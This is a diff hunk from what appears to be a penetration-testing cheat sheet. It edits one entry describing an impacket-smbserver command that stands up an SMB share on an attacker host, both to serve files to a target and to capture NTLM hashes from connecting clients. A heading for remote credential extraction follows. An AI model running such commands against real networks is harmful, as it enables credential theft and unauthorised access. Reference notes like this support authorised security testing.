@@ -80,7 +80,7 @@
 - **Yields:** File hosting for target download; optional NTLM hash capture from connecting clients
 - **Opsec:** Med
 - **Context:** Need to host files for download by target or capture NTLM auth attempts against a controlled SMB share
-- **Payload/Method:** `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /path/to/files/`
+- **Payload/Method:** `impacket-smbserver -ip <ATTACKER_IP> -smb2support -username user -password password shared /path/to/files/`
 
 ## nxc Remote Credential Extraction
 
